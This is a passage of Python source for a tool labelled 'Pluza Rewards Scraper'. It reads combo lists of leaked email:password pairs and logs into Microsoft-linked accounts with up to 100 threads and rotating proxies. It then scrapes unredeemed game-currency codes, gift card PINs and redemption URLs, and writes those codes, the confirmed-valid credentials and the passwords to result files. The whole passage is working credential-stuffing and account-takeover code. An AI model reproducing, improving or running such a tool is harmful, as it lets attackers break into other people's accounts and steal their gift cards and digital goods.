                            # Try multiple extraction patterns (exact backup method)
                            try:
                                rs = code_soup.find('div', class_='resendSuccess')
                                if rs:
                                    keys = rs.find_all('div', class_=re.compile(r'tango-credential-key', re.I))
                                    vals = rs.find_all('div', class_=re.compile(r'tango-credential-value', re.I))
                                    for k, v in zip(keys, vals):
                                        key_text = k.get_text(strip=True).upper()
                                        if 'CODE' in key_text or 'PIN' in key_text:
                                            code = v.get_text(strip=True)
                                            if '*' not in code:
                                                code_found = True
                                                break
                            except:
                                pass
                            
                            if not code_found:
                                # Extract code using config pattern
                                config = self.category_config.get(self.category, self.category_config['All'])
                                code_match = re.search(config['code_pattern'], code_html)
                                if code_match:
                                    code = code_match.group(1)
                                    if '*' not in code:
                                        code_found = True
                            
                            if not code_found:
                                # Generic PIN pattern
                                pin_match = re.search(r'PIN\s*:\s*([A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4})', code_html, re.I)
                                if pin_match:
                                    code = pin_match.group(1)
                                    if '*' not in code:
                                        code_found = True
                            
                            if not code_found:
                                # Generic CODE pattern
                                code_match = re.search(r'CODE\s*:\s*([A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4})', code_html, re.I)
                                if code_match:
                                    code = code_match.group(1)
                                    if '*' not in code:
                                        code_found = True
                            
                            if not code_found:
                                # Look in pre/code tags
                                for tag in code_soup.find_all(['pre', 'code']):
                                    text_content = tag.get_text(strip=True)
                                    for pattern in code_patterns:
                                        if re.match(pattern, text_content):
                                            code = text_content
                                            if '*' not in code:
                                                code_found = True
                                                break
                                    if code_found:
                                        break
                            
                            if not code_found:
                                # Look for clipboard buttons
                                for btn in code_soup.find_all('button', attrs={'data-clipboard-text': True}):
                                    val = btn['data-clipboard-text'].strip()
                                    if val and len(val) >= 15:
                                        code = val
                                        if '*' not in code:
                                            code_found = True
                                            break
                            
                            if not code_found:
                                # Fallback to any pattern match
                                all_codes = re.findall(r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}|[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}|[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}', code_html)
                                for extracted_code in all_codes:
                                    code = extracted_code
                                    if '*' not in code:
                                        code_found = True
                                        break
                            
                            # Check for redemption URL (for gift cards and short codes)
                            redemption_url = None
                            
                            # Check for gift cards first (regardless of length)
                            if 'gift' in code_info.lower() or 'card' in code_info.lower() or '$' in code_info.lower() or 'amazon' in code_info.lower() or 'spotify' in code_info.lower():
                                # Debug: Print HTML content for gift cards
                                console.print(f"[DEBUG] Gift card detected: {code} | Searching for redemption URL in HTML...", style="dim yellow")
                                console.print(f"[DEBUG] HTML snippet: {code_html[:500]}...", style="dim red")
                                
                                # Try multiple patterns for redemption URLs - updated with your specific pattern
                                patterns = [
                                    # Pattern for single quotes (actual HTML)
                                    r"<div class='tango-credential-key'><a href='([^']*)'[^>]*>Redemption URL</a></div>",
                                    r"<div class='tango-credential-key'><a href='([^']*)'[^>]*target='_blank'>Redemption URL</a></div>",
                                    # Mixed quotes pattern
                                    r"<div class=['\"]tango-credential-key['\"]><a href=['\"]([^'\"]*)['\"][^>]*>Redemption URL</a></div>",
                                    # Flexible patterns with single quotes
                                    r"<div[^>]*class=['\"]tango-credential-key['\"][^>]*>.*?<a[^>]*href=['\"]([^'\"]*)['\"][^>]*>Redemption URL</a>.*?</div>",
                                    r"<div[^>]*class=['\"]tango-credential-key['\"][^>]*>\s*<a[^>]*href=['\"]([^'\"]*)['\"][^>]*>Redemption URL</a>\s*</div>",
                                    # Double quote patterns (fallback)
                                    r'<div class="tango-credential-key"><a href="([^"]*)"[^>]*>Redemption URL</a></div>',
                                    r'<div class="tango-credential-key"><a href="([^"]*)"[^>]*target="_blank">Redemption URL</a></div>',
                                    r'<div[^>]*class="tango-credential-key"[^>]*>.*?<a[^>]*href="([^"]*)"[^>]*>Redemption URL</a>.*?</div>',
                                    # Generic patterns
                                    r'<a[^>]*href="([^"]*)"[^>]*>Redemption URL</a>',
                                    r'<a[^>]*href="([^"]*)"[^>]*>Redeem</a>',
                                    r'<a[^>]*href="([^"]*)"[^>]*>Claim</a>',
                                    r'href="([^"]*redeem[^"]*)"',
                                    r'href="([^"]*claim[^"]*)"',
                                    r'Redemption URL:\s*(https?://[^\s<>"\']+)',
                                    r'URL:\s*(https?://[^\s<>"\']+)',
                                    # Last resort - any https URL in the HTML
                                    r'https?://[^\s<>"\'\)]+',
                                ]
                                
                                for i, pattern in enumerate(patterns):
                                    redemption_url_match = re.search(pattern, code_html, re.IGNORECASE | re.DOTALL)
                                    if redemption_url_match:
                                        redemption_url = redemption_url_match.group(1).strip().replace('\n', '').replace(' ', '')
                                        console.print(f"[DEBUG] Found redemption URL with pattern {i}: {redemption_url}", style="dim green")
                                        break
                                
                                if not redemption_url:
                                    console.print(f"[DEBUG] No redemption URL found for {code}", style="dim red")
                            
                            # Also check for short codes (8 chars or less)
                            elif code_found and code and len(code.replace('-', '')) <= 8:
                                redemption_url_match = re.search(r'<a[^>]*href="([^"]*)"[^>]*>Redemption URL</a>', code_html)
                                if redemption_url_match:
                                    redemption_url = redemption_url_match.group(1)
                            
                            if code_found and code:
                                result = {
                                    'email': email,
                                    'password': password,
                                    'code': code,
                                    'info': code_info,
                                    'category': self.category,
                                    'date': order_date or datetime.now().strftime('%Y-%m-%d %H:%M:%S'),  # Use order date, fallback to current time
                                    'redemption_url': redemption_url or ""
                                }
                                
                                self.results.append(result)
                                
                                if email not in [acc[0] for acc in self.valid_accounts]:
                                    self.valid_accounts.append((email, password))
                        
                        except Exception as e:
                            continue
                    elif resend_button:
                        continue
                    else:
                        # Fallback to old method for rows without "Get code" button
                        order_title = cells[2].get_text(strip=True) if len(cells) > 2 else ""
                        # Extract order date from the second cell (usually contains date)
                        order_date = cells[1].get_text(strip=True) if len(cells) > 1 else ""
                        code_cell = cells[3] if len(cells) > 3 else cells[2]
                        code_text = code_cell.get_text(strip=True)
                        
                        for pattern in code_patterns:
                            codes_found = re.findall(pattern, code_text.upper())
                            for code in codes_found:
                                # Skip masked codes
                                if '*' in code:
                                    continue
                                
                                # Skip if code is in exclude list
                                if code in exclude_words:
                                    continue
                                
                                # Skip if code doesn't have enough alphanumeric characters
                                alnum_count = sum(c.isalnum() for c in code.replace('-', ''))
                                if alnum_count < 12:
                                    continue
                                
                                # Additional validation
                                parts = code.split('-')
                                if len(parts) < 3:
                                    continue
                                
                                if len(set(len(part) for part in parts)) > 1:
                                    continue
                                
                                if any(part.count(part[0]) > 2 for part in parts):
                                    continue
                                
                                # Get category
                                detected_category = self.detect_category_from_title(order_title, full_row_text)
                                
                                # Extract code info
                                code_info = self.extract_code_info(order_title, detected_category, full_row_text)
                                
                                # Check for redemption URL for gift cards
                                redemption_url = None
                                if 'gift' in code_info.lower() or 'card' in code_info.lower() or '$' in code_info.lower() or 'amazon' in code_info.lower() or 'spotify' in code_info.lower():
                                    redemption_url_match = re.search(r'<a[^>]*href="([^"]*)"[^>]*>Redemption URL</a>', code_text)
                                    if redemption_url_match:
                                        redemption_url = redemption_url_match.group(1)
                                
                                result = {
                                    'email': email,
                                    'password': password,
                                    'code': code,
                                    'info': code_info,
                                    'category': detected_category,
                                    'date': order_date or datetime.now().strftime('%Y-%m-%d %H:%M:%S'),  # Use order date, fallback to current time
                                    'redemption_url': redemption_url or ""
                                }
                                
                                self.results.append(result)
                                
                                if email not in [acc[0] for acc in self.valid_accounts]:
                                    self.valid_accounts.append((email, password))
                
                # If no table found, try alternative parsing
                if not rows:
                    # Look for any div or span with code patterns
                    all_text = soup.get_text()
                    for pattern in code_patterns:
                        codes_found = re.findall(pattern, all_text.upper())
                        for code in codes_found:
                            if '*' in code:
                                continue
                            
                            # Skip if code is in exclude list
                            if code in exclude_words:
                                continue
                            
                            # Skip if code doesn't have enough alphanumeric characters
                            alnum_count = sum(c.isalnum() for c in code.replace('-', ''))
                            if alnum_count < 8:  # Require at least 8 alphanumeric chars
                                continue
                            
                            # Try to find context
                            parent = soup.find(string=re.compile(code))
                            if parent:
                                parent_element = parent.parent
                                context_text = parent_element.get_text(strip=True) if parent_element else ""
                                
                                # Extract category from context
                                detected_category = self.detect_category_from_title(context_text, context_text)
                                
                                # Extract code info
                                code_info = self.extract_code_info(context_text, detected_category, context_text)
                                
                                # Check for redemption URL for gift cards
                                redemption_url = None
                                if 'gift' in code_info.lower() or 'card' in code_info.lower() or '$' in code_info.lower() or 'amazon' in code_info.lower() or 'spotify' in code_info.lower():
                                    redemption_url_match = re.search(r'<a[^>]*href="([^"]*)"[^>]*>Redemption URL</a>', all_text)
                                    if redemption_url_match:
                                        redemption_url = redemption_url_match.group(1)
                                
                                result = {
                                    'email': email,
                                    'password': password,
                                    'code': code,
                                    'info': code_info,
                                    'category': detected_category,
                                    'date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                                    'redemption_url': redemption_url or ""
                                }
                                
                                self.results.append(result)
                                
                                if email not in [acc[0] for acc in self.valid_accounts]:
                                    self.valid_accounts.append((email, password))
                
                return True if self.results else False
                
            except Exception as e:
                print(f"Error scraping {email}: {e}")
                return False
            
        except Exception as e:
            print(f"Error with {email}: {e}")
            return False
    
    def check_single(self, email, password):
        """Check single account with proxy retry logic"""
        max_retries = 2  # Reduced from 3 to 2 for speed
        last_error = None
        
        for attempt in range(max_retries):
            try:
                success = self.login_and_scrape(email, password)
                if success:
                    return True
                else:
                    self.invalid_accounts.append((email, password))
                    return False
                    
            except Exception as e:
                # Check if it's a connection error and retry with proxy
                error_msg = str(e).lower()
                if any(keyword in error_msg for keyword in ['timeout', 'connection', 'network', 'ssl', 'certificate', 'aborted', 'file not found']) and attempt < max_retries - 1:
                    if self.proxy_manager and self.proxy_manager.proxy_settings.get('use_proxies', False):
                        proxy = self.proxy_manager.get_random_proxy()
                        if proxy:
                            # Temporarily set proxy for next attempt
                            original_use_proxies = self.proxy_manager.proxy_settings.get('use_proxies')
                            self.proxy_manager.proxy_settings['use_proxies'] = True
                            console.print(f"[*] Retrying {email} with proxy (attempt {attempt + 2}/{max_retries})", style="yellow")
                            continue
                
                # If it's the last attempt or not a connection error, break
                break
        
        # All retries failed
        self.invalid_accounts.append((email, password))
        return False
    
    def check_all(self):
        """Check all accounts with multi-threading"""
        if not self.accounts:
            console.print("[!] No accounts to check", style="red")
            return
        
        console.print("\n" + "╔" + "═"*59 + "╗", style="cyan")
        console.print("║" + " " * 20 + f"prs - {self.category.upper()} SCRAPER" + " " * 22 + "║", style="cyan")
        console.print("╚" + "═"*59 + "╝", style="cyan")
        
        max_threads = self.settings.get('max_threads', 100)
        console.print(f"[*] Starting batch check: {len(self.accounts)} accounts", style="cyan")
        console.print(f"[*] Category: {self.category} | Timeout: {self.settings.get('timeout')}s | Threads: {max_threads}", style="cyan")
        
        with Progress(
            TextColumn("[cyan]{task.description}"),
            BarColumn(bar_width=30, style="cyan", complete_style="cyan"),
            TextColumn("[cyan]{task.percentage:>3.0f}% | CPM: {task.fields[cpm]:>3.0f}"),
            console=console,
            refresh_per_second=5  # Update every 0.2 seconds for smooth display
        ) as progress:
            task = progress.add_task(f"[cyan]Checking accounts...", total=len(self.accounts), cpm=0)
            
            # Track CPM calculation (Accounts Per Minute)
            start_time = time.time()
            last_accounts_checked = 0
            last_cpm_update = start_time
            last_progress_update = start_time
            accounts_at_last_update = 0
            
            # Process accounts in batches for better progress tracking
            batch_size = 500  # Increased batch size for better performance
            completed_count = 0
            
            for batch_start in range(0, len(self.accounts), batch_size):
                batch_end = min(batch_start + batch_size, len(self.accounts))
                batch_accounts = self.accounts[batch_start:batch_end]
                
                with ThreadPoolExecutor(max_workers=max_threads) as executor:
                    futures = {executor.submit(self.check_single, email, password): (email, password) 
                              for email, password in batch_accounts}
                    
                    for future in as_completed(futures):
                        email, password = futures[future]
                        try:
                            result = future.result()
                            # Show codes in clean format only
                            if result and self.results:
                                # Find codes found for this account
                                account_codes = [r for r in self.results if r['email'] == email]
                                if account_codes:
                                    for code_result in account_codes:
                                        # Only show if not already shown
                                        if not hasattr(self, '_shown_codes'):
                                            self._shown_codes = set()
                                        code_key = (code_result['code'], code_result['email'])
                                        if code_key not in self._shown_codes:
                                            # Check if this is a gift card with redemption URL
                                            if code_result['category'].lower() == 'giftcards' and code_result.get('redemption_url'):
                                                # Show full format for gift cards with redemption URLs
                                                console.print(f"[ + ] Code: {code_result['code']}", style="green")
                                                console.print(f"     URL: {code_result['redemption_url']}", style="cyan")
                                                console.print(f"     Account: {code_result['email']}", style="blue")
                                                console.print(f"     Password: {code_result['password']}", style="blue")
                                                console.print(f"     Info: {code_result['info']}", style="yellow")
                                                console.print(f"     Date: {code_result['date']}", style="dim")
                                                console.print(f"     {'-'*30}", style="dim")
                                            else:
                                                # Clean format for other codes: [ + ] CODE | INFO
                                                console.print(f"[ + ] {code_result['code']} | {code_result['info']}", style="green")
                                            self._shown_codes.add(code_key)
                        except Exception as e:
                            # Don't show any errors or failures
                            pass
                        
                        completed_count += 1
                        progress.advance(task)
                        
                        current_time = time.time()
                        
                        # Update progress display every 5 seconds
                        if current_time - last_progress_update >= 5:
                            elapsed_minutes = (current_time - start_time) / 60
                            apm = completed_count / elapsed_minutes if elapsed_minutes > 0 else 0
                            progress.update(task, cpm=apm)
                            last_progress_update = current_time
        
        console.print(f"\n[✓] Completed: {len(self.accounts)} accounts checked", style="green")
        console.print(f"[+] Codes found: {len(self.results)}", style="cyan")
        
        # Save results using backup method
        if self.results:
            self.save_results()
        
    def save_results(self):
        """Save results to timestamped folder with category txt files (exact backup method)"""
        timestamp = datetime.now().strftime('%m%d%Y%H%M')
        results_folder = Path(__file__).parent / f"results-{timestamp}"
        
        try:
            # Create results folder
            results_folder.mkdir(exist_ok=True)
            
            # Create category txt files and save codes
            category_codes = {}
            
            # Organize codes by category (exact backup method)
            for result in self.results:
                code = result['code']
                info = result['info']
                email = result['email']
                password = result['password']
                
                # Detect category from title (exact backup method)
                detected_category = self.detect_category_from_title(info, info)
                
                # Normalize category name for file (exact backup method)
                if detected_category == 'Unknown':
                    # If category is Unknown but we have a title with amount info, try to infer
                    if '200 coins' in info.lower() or '500 coins' in info.lower() or '1000 coins' in info.lower():
                        file_name = 'overwatch'
                    elif 'robux' in info.lower():
                        file_name = 'roblox'
                    elif 'minecoins' in info.lower() or 'minecraft' in info.lower():
                        file_name = 'minecraft'
                    elif 'rp' in info.lower():
                        file_name = 'leagueoflegends'
                    elif 'gift' in info.lower() or 'card' in info.lower() or '$' in info.lower():
                        file_name = 'giftcards'
                    elif 'game pass' in info.lower():
                        file_name = 'gamepass'
                    else:
                        file_name = 'unknown'
                else:
                    file_name = detected_category.lower().replace(' ', '').replace('of', 'of')
                
                if file_name not in category_codes:
                    category_codes[file_name] = []
                
                category_codes[file_name].append({
                    'code': code,
                    'title': info,
                    'email': email,
                    'password': password
                })
            
            # Create category txt files and save codes (exact backup method)
            for category, codes in category_codes.items():
                category_file = results_folder / f"{category}.txt"
                with open(category_file, 'w', encoding='utf-8') as f:
                    f.write(f"{category.upper()} CODES\n")
                    f.write(f"{'='*50}\n\n")
                    
                    for code_info in codes:
                        # Special handling for giftcards with redemption URLs
                        if category.lower() == 'giftcards' and any(result.get('redemption_url') for result in self.results if result['code'] == code_info['code']):
                            # Find the result with redemption URL
                            redemption_result = next((r for r in self.results if r['code'] == code_info['code'] and r.get('redemption_url')), None)
                            if redemption_result:
                                f.write(f"Code: {code_info['code']}\n")
                                f.write(f"URL: {redemption_result['redemption_url']}\n")
                                f.write(f"Account: {code_info['email']}\n")
                                f.write(f"Password: {code_info['password']}\n")
                                f.write(f"Info: {code_info['title']}\n")
                                f.write(f"Date: {redemption_result['date']}\n")
                                f.write(f"{'-'*30}\n\n")
                            else:
                                # Standard format if no redemption URL found
                                f.write(f"{code_info['code']}\n")
                                f.write(f"Account: {code_info['email']}\n")
                                f.write(f"Password: {code_info['password']}\n")
                                f.write(f"Info: {code_info['title']}\n")
                                # Find the result to get the actual date
                                result_match = next((r for r in self.results if r['code'] == code_info['code']), None)
                                if result_match:
                                    f.write(f"Date: {result_match['date']}\n")
                                else:
                                    f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                                f.write(f"{'-'*30}\n\n")
                        else:
                            # Standard format for non-giftcards or giftcards without redemption URLs
                            f.write(f"{code_info['code']}\n")
                            f.write(f"Account: {code_info['email']}\n")
                            f.write(f"Password: {code_info['password']}\n")
                            f.write(f"Info: {code_info['title']}\n")
                            # Find the result to get the actual date
                            result_match = next((r for r in self.results if r['code'] == code_info['code']), None)
                            if result_match:
                                f.write(f"Date: {result_match['date']}\n")
                            else:
                                f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                            f.write(f"{'-'*30}\n\n")
            
            # Also create sorted versions of each category file
            console.print(f"\n[🔄] Creating sorted category files...", style="cyan")
            for category, codes in category_codes.items():
                sort_and_save_codes(results_folder, codes, category, self.results)
            
            # Save valid accounts file (exact backup method)
            valid_file = results_folder / "valid.txt"
            with open(valid_file, 'w', encoding='utf-8') as f:
                f.write("VALID ACCOUNTS\n")
                f.write(f"{'='*50}\n\n")
                
                for email, password in self.accounts:
                    if email in [acc[0] for acc in self.valid_accounts]:
                        f.write(f"{email}:{password}\n")
            
            # Create summary file (exact backup method)
            summary_file = results_folder / "summary.txt"
            with open(summary_file, 'w', encoding='utf-8') as f:
                f.write(f"{'═'*70}\n")
                f.write(f"{self.category.upper()} Results Summary - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"{'═'*70}\n")
                f.write(f"Valid Accounts: {len(self.valid_accounts)}\n")
                f.write(f"Invalid Accounts: {len(self.invalid_accounts)}\n")
                f.write(f"Total Codes: {len(self.results)}\n")
                f.write(f"{'═'*70}\n\n")
                
                # List codes by category
                for category, codes in category_codes.items():
                    f.write(f"{category.upper()} ({len(codes)} codes):\n")
                    for code_info in codes:
                        f.write(f"  {code_info['code']} - {code_info['title']}\n")
                    f.write("\n")
                
                f.write(f"{'═'*70}\n")
                f.write("Multi-Platform Rewards Scraper\n")
                f.write(f"{'═'*70}\n")
            
            console.print(f"✓ Results saved to: {results_folder}", style="green")
            console.print(f"✓ Created {len(category_codes)} category files", style="green")
            console.print(f"✓ Valid accounts saved to: valid.txt", style="green")
        except Exception as e:
            console.print(f"[!] Failed to save: {e}", style="red")
    
    def save_valid_accounts(self):
        """Save valid accounts to file"""
        timestamp = datetime.now().strftime("%m%d%Y%H%M")
        results_dir = Path(f"results-{timestamp}")
        results_dir.mkdir(exist_ok=True)
        
        valid_file = results_dir / "valid.txt"
        with open(valid_file, 'w', encoding='utf-8') as f:
            for email, password in self.valid_accounts:
                f.write(f"{email}:{password}\n")
        console.print(f"[✓] Valid accounts saved to: {valid_file}", style="green")


class ProxyManager:
    """Manage proxy lists and testing"""
    
    def __init__(self):
        self.proxies = []
        self.working_proxies = []
        self.settings_file = Path("prs_settings.json")
        self.proxy_settings = {
            'timeout': 10,
            'test_url': 'https://login.live.com/',
            'rotate': False,
            'remove_failed': True,
            'check_threads': 50,  # Number of threads for proxy checking
            'use_proxies': False  # Whether to use proxies for scraping
        }
        self.load_settings()
        self.load_proxies()
    
    def load_settings(self):
        """Load proxy settings from file"""
        if self.settings_file.exists():
            try:
                with open(self.settings_file, 'r', encoding='utf-8') as f:
                    saved_settings = json.load(f)
                    # Update default settings with saved settings
                    self.proxy_settings.update(saved_settings)
                    console.print(f"[✓] Loaded proxy settings from {self.settings_file}", style="green")
            except Exception as e:
                console.print(f"[!] Error loading settings: {e}", style="red")
    
    def save_settings(self):
        """Save proxy settings to file"""
        try:
            with open(self.settings_file, 'w', encoding='utf-8') as f:
                json.dump(self.proxy_settings, f, indent=2)
            console.print(f"[✓] Proxy settings saved to {self.settings_file}", style="green")
        except Exception as e:
            console.print(f"[!] Error saving settings: {e}", style="red")
    
    def load_proxies(self):
        """Load proxies from file"""
        proxy_file = Path("proxies.txt")
        working_proxy_file = Path("working_proxies.txt")
        
        # Load all proxies
        if proxy_file.exists():
            try:
                with open(proxy_file, 'r', encoding='utf-8') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
                console.print(f"[+] Loaded {len(self.proxies)} proxies from file", style="green")
            except Exception as e:
                console.print(f"[!] Error loading proxies: {e}", style="red")
        else:
            console.print("[!] No proxies.txt file found", style="yellow")
        
        # Load working proxies
        if working_proxy_file.exists():
            try:
                with open(working_proxy_file, 'r', encoding='utf-8') as f:
                    self.working_proxies = [line.strip() for line in f if line.strip()]
                console.print(f"[+] Loaded {len(self.working_proxies)} working proxies", style="green")
            except Exception as e:
                console.print(f"[!] Error loading working proxies: {e}", style="red")
    
    def save_proxies(self):
        """Save proxies to file"""
        try:
            with open("proxies.txt", 'w', encoding='utf-8') as f:
                for proxy in self.proxies:
                    f.write(f"{proxy}\n")
            console.print(f"[+] Saved {len(self.proxies)} proxies to file", style="green")
        except Exception as e:
            console.print(f"[!] Error saving proxies: {e}", style="red")
    
    def save_working_proxies(self):
        """Save working proxies to separate file"""
        try:
            with open("working_proxies.txt", 'w', encoding='utf-8') as f:
                for proxy in self.working_proxies:
                    f.write(f"{proxy}\n")
            console.print(f"[+] Saved {len(self.working_proxies)} working proxies to file", style="green")
        except Exception as e:
            console.print(f"[!] Error saving working proxies: {e}", style="red")
    
    def add_proxy(self, proxy):
        """Add a proxy to the list"""
        if proxy not in self.proxies:
            self.proxies.append(proxy)
            return True
        return False
    
    def remove_proxy(self, proxy):
        """Remove a proxy from the list"""
        if proxy in self.proxies:
            self.proxies.remove(proxy)
            return True
        return False
    
    def test_proxy(self, proxy):
        """Test if a proxy is working"""
        try:
            proxy_dict = {
                'http': f'http://{proxy}',
                'https': f'http://{proxy}'
            }
            response = requests.get(
                self.proxy_settings['test_url'],
                proxies=proxy_dict,
                timeout=self.proxy_settings['timeout'],
                verify=False
            )
            return response.status_code == 200
        except:
            return False
    
    def test_all_proxies(self):
        """Test all proxies and update working list"""
        console.print(f"[*] Testing {len(self.proxies)} proxies...", style="cyan")
        self.working_proxies = []
        
        with Progress(
            TextColumn("[cyan]{task.description}"),
            BarColumn(bar_width=30, style="cyan", complete_style="cyan"),
            TextColumn("[cyan]{task.percentage:>3.0f}%"),
            console=console
        ) as progress:
            task = progress.add_task("[cyan]Testing proxies...", total=len(self.proxies))
            
            def test_single_proxy(proxy):
                if self.test_proxy(proxy):
                    self.working_proxies.append(proxy)
                progress.advance(task)
            
            # Use threading for faster proxy checking
            with ThreadPoolExecutor(max_workers=self.proxy_settings['check_threads']) as executor:
                futures = [executor.submit(test_single_proxy, proxy) for proxy in self.proxies]
                for future in as_completed(futures):
                    future.result()
        
        console.print(f"[+] Working proxies: {len(self.working_proxies)}/{len(self.proxies)}", style="green")
        
        # Save working proxies to file
        self.save_working_proxies()
        
        # Remove failed proxies if setting is enabled
        if self.proxy_settings['remove_failed']:
            failed_count = len(self.proxies) - len(self.working_proxies)
            if failed_count > 0:
                self.proxies = self.working_proxies.copy()
                self.save_proxies()
                console.print(f"[-] Removed {failed_count} failed proxies", style="yellow")
    
    def get_random_proxy(self):
        """Get a random working proxy"""
        if self.working_proxies:
            import random
            return random.choice(self.working_proxies)
        return None
    
    def get_next_proxy(self):
        """Get next proxy for rotation"""
        if not self.working_proxies:
            return None
        
        if not hasattr(self, '_proxy_index'):
            self._proxy_index = 0
        
        proxy = self.working_proxies[self._proxy_index]
        self._proxy_index = (self._proxy_index + 1) % len(self.working_proxies)
        return proxy
    
    def clear_proxies(self):
        """Clear all proxies"""
        self.proxies = []
        self.working_proxies = []
        try:
            Path("proxies.txt").unlink(missing_ok=True)
            Path("working_proxies.txt").unlink(missing_ok=True)
            console.print("[+] All proxies cleared", style="green")
        except:
            pass


class RewardsApp:
    """Main application class"""
    
    def __init__(self):
        self.settings = Settings()
        self.accounts = []
        self.proxy_manager = ProxyManager()
    
    def show_animated_logo(self):
        """Display simple title screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
        console.print("\n" + "╔" + "═"*58 + "╗", style="cyan")
        console.print("║" + " " * 16 + "prs - Pluza Rewards Scraper" + " " * 15 + "║", style="cyan")
        console.print("╠" + "═"*58 + "╣", style="cyan")
        console.print("║  1. MINECRAFT - Minecraft Minecoins Checker              ║", style="cyan")
        console.print("║  2. ROBLOX - Robux & Items Checker                       ║", style="cyan")
        console.print("║  3. LEAGUE OF LEGENDS - RP Points Checker                ║", style="cyan")
        console.print("║  4. OVERWATCH - Overwatch Coins Checker                  ║", style="cyan")
        console.print("║  5. SEA OF THIEVES - Coins Checker                       ║", style="cyan")
        console.print("║  6. GAME PASS - Xbox Game Pass Checker                   ║", style="cyan")
        console.print("║  7. GIFTCARDS - Gift Cards Checker                       ║", style="cyan")
        console.print("║  8. ALL CATEGORIES - All Platforms Checker               ║", style="cyan")
        console.print("║  9. SETTINGS - Configuration Settings                    ║", style="cyan")
        console.print("║  10. PROXY - Proxy Configuration                         ║", style="cyan")
        console.print("║  11. EXIT - Exit Program                                 ║", style="cyan")
        console.print("║ programed by @plutobearz                                 ║", style="cyan")
        console.print("╚" + "═"*58 + "╝", style="cyan")
        console.print("\nSelect option (1-11): ", style="cyan", end="")
    
    def show_main_menu(self):
        """Display main menu and handle user input"""
        while True:
            self.show_animated_logo()
            
            try:
                choice = input().strip()
                
                if choice == '1':
                    self.scraper_menu('Minecraft')
                elif choice == '2':
                    self.scraper_menu('Roblox')
                elif choice == '3':
                    self.scraper_menu('League of Legends')
                elif choice == '4':
                    self.scraper_menu('Overwatch')
                elif choice == '5':
                    self.scraper_menu('Sea of Thieves')
                elif choice == '6':
                    self.scraper_menu('Game Pass')
                elif choice == '7':
                    self.scraper_menu('Giftcards')
                elif choice == '8':
                    self.scraper_menu('All')
                elif choice == '9':
                    self.settings_menu()
                elif choice == '10':
                    self.proxy_menu()
                elif choice == '11':
                    console.print("\n[+] Goodbye!", style="green")
                    sys.exit(0)
                else:
                    console.print("\n[!] Invalid option. Please try again.", style="red")
                    time.sleep(1)
            except KeyboardInterrupt:
                console.print("\n[+] Goodbye!", style="green")
                sys.exit(0)
            except Exception as e:
                console.print(f"\n[!] Error: {e}", style="red")
                time.sleep(1)
    
    def scraper_menu(self, category):
        """Display scraper menu for selected category"""
        os.system('cls' if os.name == 'nt' else 'clear')
        console.print("\n" + "╔" + "═"*58 + "╗", style="cyan")
        console.print("║" + " " * 20 + f"prs - {category.upper()} SCRAPER" + " " * 20 + "║", style="cyan")
        console.print("╚" + "═"*58 + "╝", style="cyan")
        
        # Get combo file using tkinter file dialog
        console.print("Opening file explorer...", style="cyan")
        root = Tk()
        root.withdraw()
        root.attributes('-topmost', True)
        
        file_path = filedialog.askopenfilename(
            title="Select Combo File",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        root.destroy()
        
        if not file_path:
            console.print("[!] No file selected", style="red")
            time.sleep(2)
            return
        
        # Parse combo file
        parser = ComboParser(file_path)
        accounts = parser.parse()
        
        load_error = None
        if not accounts:
            load_error = "No valid EMAIL:PASS combinations found"
        
        if load_error:
            console.print(f"[!] {load_error}", style="red")
            time.sleep(2)
            return
        
        if not accounts:
            console.print("[!] No valid EMAIL:PASS found in file", style="red")
            time.sleep(2)
            return
        
        console.print(f"\n✓ Loaded {len(accounts)} accounts\n", style="green")
        
        # Show confirmation
        console.print("Accounts to check:", style="cyan")
        
        table = Table()
        table.add_column("Email", style="cyan")
        table.add_column("Password", style="yellow")
        
        # Show first 10
        for email, password in accounts[:10]:
            pwd_masked = password[:3] + "*" * (len(password) - 3)
            table.add_row(email, pwd_masked)
        
        if len(accounts) > 10:
            table.add_row(f"... and {len(accounts) - 10} more", "")
        
        console.print(table)
        console.print(f"\nTotal: {len(accounts)} accounts\n", style="yellow")
        
        response = input("→ Start checking? (y/n): ").strip().lower()
        
        if response not in ['y', 'yes']:
            console.print("[!] Aborted by user", style="red")
            time.sleep(1)
            return
        
        # Run scraper
        scraper = MultiPlatformScraper(accounts, self.settings, category, self.proxy_manager)
        scraper.check_all()
        
        console.print("\n✓ Done!", style="green")
        input("Press Enter to return to menu...")

    
    def settings_menu(self):
        """Settings configuration menu"""
        first_time = True
        while True:
            if first_time:
                os.system('cls' if os.name == 'nt' else 'clear')
            else:
                console.print("\n" + "="*70, style="cyan")
            
            console.print("\n" + "╔" + "═"*58 + "╗", style="cyan")
            console.print("║" + " " * 20 + "prs - SETTINGS" + " " * 20 + "║", style="cyan")
            console.print("╚" + "═"*58 + "╝", style="cyan")
            
            console.print("\n[cyan]Current Settings:[/cyan]\n")
            
            settings_display = [
                ("Timeout (seconds)", 'timeout'),
                ("Max Threads", 'max_threads'),
                ("Retry Count", 'retry_count'),
                ("Save Invalid Accounts", 'save_invalid'),
                ("Auto Save Results", 'auto_save'),
                ("Default Category", 'selected_category')
            ]
            
            for i, (display_name, key) in enumerate(settings_display, 1):
                value = self.settings.get(key)
                if isinstance(value, bool):
                    value = "Enabled" if value else "Disabled"
                console.print(f"  {i}. {display_name}: [yellow]{value}[/yellow]")
            
            console.print("\n  0. Back to Main Menu")
            console.print("\nSelect setting to modify (0-6): ", style="cyan", end="")
            
            try:
                choice = input().strip()
                
                if choice == '0':
                    break
                elif choice in ['1', '2', '3', '4', '5', '6']:
                    idx = int(choice) - 1
                    _, key = settings_display[idx]
                    self.modify_setting(key)
                else:
                    console.print("\n[!] Invalid option", style="red")
                    time.sleep(1)
            except KeyboardInterrupt:
                break
            
            first_time = False
        
        self.settings.save()
    
    def modify_setting(self, key):
        """Modify a specific setting"""
